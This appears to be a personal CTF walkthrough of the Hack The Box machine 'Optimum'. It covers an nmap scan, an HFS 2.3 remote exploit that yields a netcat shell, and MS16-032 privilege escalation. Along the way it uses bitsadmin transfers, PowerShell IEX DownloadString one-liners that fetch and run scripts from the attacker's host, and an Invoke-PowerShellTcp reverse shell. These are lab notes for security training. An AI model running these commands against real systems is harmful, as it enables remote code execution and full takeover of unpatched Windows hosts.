<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>10.10.10.8 Optimum</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>10.10.10.8 Optimum</h1><br/>root@kali:~/Desktop/HTB/Optimum# nmap -sC -sV -oN 10.10.10.8.txt 10.10.10.8<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-07-09 20:01 EDT<br />Nmap scan report for 10.10.10.8<br />Host is up (0.13s latency).<br />Not shown: 999 filtered ports<br />PORT   STATE SERVICE VERSION<br />80/tcp open  http    HttpFileServer httpd 2.3<br />|_http-server-header: HFS 2.3<br />|_http-title: HFS /<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 22.51 seconds<br /><br />searchsploit HFS<br />searchsploit -p exploits/windows/remote/39161.py<br />cp /usr/share/exploitdb/exploits/windows/remote/39161.py Optimum39161.py<br />nano Optimum39161.py (changed ip to local ip and local port to 3232)<br />service apache2 start<br />copied nc.exe into /var/www/html<br />nc -lvnp 3232<br />ran Optimum39161.py twice, and got a user shell!<br /><br />added Find-AllVulns to the bottom of Sherlock.py and put Sherlock.py in /var/www/html/<br />bitsadmin /transfer SherlockJob /download <a href="http://10.10.14.60/Sherlock.ps1">http://10.10.14.60/Sherlock.ps1</a> C:\users\kostas\Downloads\Sherlock.ps1<br />powershell.exe C:\Users\kostas\Downloads\Sherlock.ps1<br />Title      : Secondary Logon Handle<br />MSBulletin : MS16-032&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<br />CVEID      : 2016-0099<br />Link       : <a href="https://www.exploit-db.com/exploits/39719/">https://www.exploit-db.com/exploits/39719/</a><br />VulnStatus : Appears Vulnerable<br /><br />Title      : Windows Kernel-Mode Drivers EoP<br />MSBulletin : MS16-034<br />CVEID      : 2016-0093/94/95/96<br />Link       : <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1</a><br />             6-034?<br />VulnStatus : Appears Vulnerable<br /><br />Title      : Win32k Elevation of Privilege<br />MSBulletin : MS16-135<br />CVEID      : 2016-7255<br />Link       : <a href="https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S">https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S</a><br />             ample-Exploits/MS16-135<br />VulnStatus : Appears Vulnerable<br /><br />from powershell empire take the Invoke-MS16032.ps1 script and add                Invoke-MS16032 -Command C:\Users\kostas\Downloads\Invoke-PowerShellTcp.ps1                      to the bottom<br />from powershell empire take the Invoke-PowershellTCP.ps1 script and add          Invoke-PowershellTcp -Reverse -IPAddress 10.10.14.60 -port 3233                                         to the bottom<br />host both of the files<br />bitsadmin /transfer Ms16032Job /download <a href="http://10.10.14.60/Sherlock.ps1">http://10.10.14.60/Invoke-MS16032.ps1</a> C:\users\kostas\Downloads\Invoke-MS16032.ps1<br />same for invoke powershell script<br />in terminal<br />    nc -nlvp 3233<br />C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe C:\Users\kostas\Downloads\Invoke-MS16032.ps1 (this is important because ms16032 exploits powershell v1.0)<br />&#39;HOLY HANDLE LEAK BATMAN!&quot; enjoy your shell<br /><br /><br /><br /><br /><br /><br /><br />powershell.exe IEX(New-Object Net.WebClient).downloadString(&#39;<a href="http://10.10.14.60/80/sherlock.ps1')">http://10.10.14.60/Invoke-MS16032.ps1&#39;)</a><br />bitsadmin /transfer Ms16032Job /download <a href="http://10.10.14.60/Sherlock.ps1">http://10.10.14.60/Invoke-PowerShellTcp.ps1</a> C:\users\kostas\Downloads\Invoke-PowerShellTcp.ps1<br />IEX(New-Object Net.WebClient).downloadString(&#39;<a href="http://10.10.14.60/80/sherlock.ps1')">http://10.10.14.60:80/Shell3232.ps1&#39;)</a><br />Invoke-MS16-032 -Command &quot;iex(New-Object Net.WebClient).DownloadString(&#39;<a href="http://google.com')"">http://google.com&#39;)&quot;</a><br />IEX(New-Object Net.WebClient).downloadString(&#39;<a href="http://10.10.14.60/80/sherlock.ps1')">http://10.10.14.60:80/sherlock.ps1&#39;)</a></div></body></html>